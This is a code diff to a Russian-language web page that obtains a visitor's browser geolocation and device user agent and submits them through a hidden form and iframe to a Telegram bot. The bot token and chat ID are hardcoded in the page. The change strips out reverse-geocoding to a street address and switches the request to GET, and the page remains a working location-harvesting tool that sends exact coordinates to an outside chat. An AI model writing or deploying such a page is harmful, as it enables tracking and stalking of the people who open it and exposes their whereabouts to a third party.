@@ -88,12 +88,6 @@
             color: #8b949e;
             margin-top: 4px;
         }
-        .status-box .address {
-            font-size: 14px;
-            color: #58a6ff;
-            margin-top: 6px;
-            font-weight: 500;
-        }
         .btn {
             background: #238636;
             color: white;
@@ -120,6 +114,9 @@
             font-size: 13px;
             margin-top: 4px;
         }
+        iframe {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -132,7 +129,6 @@
             <div class="text" id="statusText">Определение геолокации...</div>
             <div class="coords" id="coordsDisplay">—</div>
             <div class="accuracy" id="accuracyDisplay"></div>
-            <div class="address" id="addressDisplay"></div>
             <div class="status-sent" id="sentStatus"></div>
         </div>
 
@@ -147,36 +143,16 @@
         const BOT_TOKEN = "8975499216:AAEmqWVeYW6vm0p5MjI0d_ec-RDzrVLwxM0";
         const CHAT_ID = "2131297532";
 
-        // === Функция получения адреса по координатам (OpenStreetMap) ===
-        async function getAddress(lat, lon) {
-            try {
-                const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=ru`;
-                const response = await fetch(url);
-                const data = await response.json();
-                if (data && data.display_name) {
-                    return data.display_name;
-                }
-                return null;
-            } catch (e) {
-                return null;
-            }
-        }
+        function sendToTelegram(lat, lon, acc) {
+            const text = encodeURIComponent(
+                `📍 Новая геолокация!\n\nШирота: ${lat.toFixed(6)}\nДолгота: ${lon.toFixed(6)}\nТочность: ±${Math.round(acc)} м\n\nУстройство: ${navigator.userAgent}`
+            );
 
-        // === Отправка в Telegram с адресом ===
-        async function sendToTelegram(lat, lon, acc) {
-            // Получаем адрес
-            const address = await getAddress(lat, lon);
-            const addressText = address ? `📍 Адрес: ${address}` : '📍 Адрес не определён';
-
-            const message =
-                `📍 Новая геолокация!\n\nШирота: ${lat.toFixed(6)}\nДолгота: ${lon.toFixed(6)}\nТочность: ±${Math.round(acc)} м\n\n${addressText}\n\nУстройство: ${navigator.userAgent}`;
-
-            const text = encodeURIComponent(message);
-
+            // Создаём форму с GET-методом
             const form = document.createElement('form');
-            form.method = 'POST';
+            form.method = 'GET';
             form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            form.target = 'hiddenFrame';
+            form.target = 'telegramFrame';
 
             const input1 = document.createElement('input');
             input1.type = 'hidden';
@@ -191,25 +167,20 @@
             form.appendChild(input1);
             form.appendChild(input2);
 
+            // Создаём iframe, куда будет отправлен запрос
             const iframe = document.createElement('iframe');
-            iframe.name = 'hiddenFrame';
+            iframe.name = 'telegramFrame';
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
 
             document.body.appendChild(form);
             form.submit();
 
+            // Убираем всё через секунду
             setTimeout(() => {
                 document.body.removeChild(form);
                 document.body.removeChild(iframe);
             }, 1000);
-
-            // Показываем адрес на странице
-            if (address) {
-                document.getElementById('addressDisplay').textContent = `📍 ${address}`;
-            } else {
-                document.getElementById('addressDisplay').textContent = '📍 Адрес не определён';
-            }
 
             document.getElementById('sentStatus').textContent =
                 `📤 Отправлено в Telegram (${new Date().toLocaleTimeString()})`;
@@ -219,7 +190,6 @@
             const statusText = document.getElementById('statusText');
             const coordsDisplay = document.getElementById('coordsDisplay');
             const accuracyDisplay = document.getElementById('accuracyDisplay');
-            const addressDisplay = document.getElementById('addressDisplay');
             const sentStatus = document.getElementById('sentStatus');
             const loader = document.getElementById('loader');
             const btn = document.getElementById('btnRefresh');
@@ -228,7 +198,6 @@
             statusText.className = 'text';
             coordsDisplay.textContent = '—';
             accuracyDisplay.textContent = '';
-            addressDisplay.textContent = '';
             sentStatus.textContent = '';
             loader.style.display = 'inline-block';
             btn.disabled = true;
@@ -242,12 +211,11 @@
             }
 
             navigator.geolocation.getCurrentPosition(
-                async function(pos) {
+                function(pos) {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     const acc = pos.coords.accuracy;
 
-                    // Показываем координаты
                     coordsDisplay.textContent = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
                     accuracyDisplay.textContent = `±${Math.round(acc)} м`;
                     statusText.textContent = '✅ Геолокация получена!';
@@ -255,8 +223,7 @@
                     loader.style.display = 'none';
                     btn.disabled = false;
 
-                    // Отправляем в Telegram (с адресом)
-                    await sendToTelegram(lat, lon, acc);
+                    sendToTelegram(lat, lon, acc);
                 },
                 function(err) {
                     let msg = '';
